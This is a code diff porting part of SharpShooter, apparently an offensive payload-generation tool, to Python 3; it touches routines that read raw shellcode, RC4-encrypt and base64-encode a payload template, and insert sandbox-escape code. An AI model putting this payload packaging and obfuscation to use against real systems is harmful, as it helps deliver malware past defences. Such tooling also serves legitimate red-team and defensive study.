@@ -166,8 +166,13 @@ class SharpShooter:
             content = fs.read()
         return content
 
+    def read_file_binary(self, f):
+        with open(f, 'rb') as fs:
+            content = fs.read()
+        return content
+
     def rand_key(self, n):
-        return ''.join([random.choice(string.lowercase) for i in xrange(n)])
+        return ''.join([random.choice(string.ascii_lowercase) for i in range(n)])
 
     def gzip_str(self, string_):
         fgz = BytesIO()
@@ -182,9 +187,9 @@ class SharpShooter:
         return fgz
 
     def rc4(self, key, data):
-        S = range(256)
+        S = list(range(256))
         j = 0
-        out = []
+        out = b''
 
         for i in range(256):
             j = (j + S[i] + ord(key[i % len(key)])) % 256
@@ -195,9 +200,9 @@ class SharpShooter:
             i = (i + 1) % 256
             j = (j + S[i]) % 256
             S[i], S[j] = S[j], S[i]
-            out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
+            out += (ord(char) ^ S[(S[i] + S[j]) % 256]).to_bytes(1, 'big')
 
-        return ''.join(out)
+        return out
 
     def run(self, args):
 
@@ -404,7 +409,6 @@ End Sub"""
         template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)
 
         delivery_method = "1"
-        encoded_sc = ""
         while True:
 
             if(args.delivery == "web"):
@@ -438,8 +442,8 @@ End Sub"""
                     shellcode_gzip = self.gzip_str(shellcode_final)
 
                 elif (args.stageless or stageless_payload is True):
-                    rawsc = self.read_file(args.rawscfile)
-                    encoded_sc = base64.b64encode(rawsc)
+                    rawsc = self.read_file_binary(args.rawscfile)
+                    encoded_sc = base64.b64encode(rawsc).decode('utf-8')
                     #if("vbs" in file_type or "hta" in file_type):
                     #    sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
                     #    for i in sc_split:
@@ -516,7 +520,7 @@ End Sub"""
 
         key = self.rand_key(10)
         payload_encrypted = self.rc4(key, template_code)
-        payload_encoded = base64.b64encode(payload_encrypted)
+        payload_encoded = base64.b64encode(payload_encrypted).decode('utf-8')
 
         awl_payload_simple = ""
 
